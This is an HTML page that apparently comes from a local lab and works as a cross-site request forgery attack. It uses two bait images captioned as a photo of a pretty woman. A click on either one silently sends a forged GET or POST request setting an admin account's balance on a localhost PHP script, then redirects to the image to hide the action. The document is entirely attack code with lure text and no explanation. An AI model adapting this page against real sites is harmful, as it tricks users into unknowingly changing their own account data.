<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>CSRF恶意请求网址</title>
	<script>
		var GETfunction = function(){
			const xhr = new XMLHttpRequest();
			xhr.open('GET','http://127.0.0.1/MyHTML/ssrf.php?uname=admin&balance=10');
			xhr.send();
			window.location.href="https://img2.baidu.com/it/u=3750954377,2882756977&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=313";
		}
		
		var POSTfunction = function(){
			const post = "uname=admin&balance=10";
			const xhr = new XMLHttpRequest();
			xhr.open('post','http://127.0.0.1/MyHTML/ssrf.php',true);
			xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
			xhr.send(post);
			window.location.href="https://img2.baidu.com/it/u=3750954377,2882756977&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=313";
		}
	</script>
</head>
<body>
<center>
	<h3>恶意GET请求：</h3>
		<img src="https://img2.baidu.com/it/u=3750954377,2882756977&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=313" title="美铝照片，点击查看详情" alt="这个美铝照片没加载出来" onclick="GETfunction()"/>
	<h3>恶意POST请求：</h3>
		<img src="https://img2.baidu.com/it/u=3750954377,2882756977&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=313" title="美铝照片，点击查看详情" alt="这个美铝照片没加载出来" onclick="POSTfunction()"/>
</center>
</body>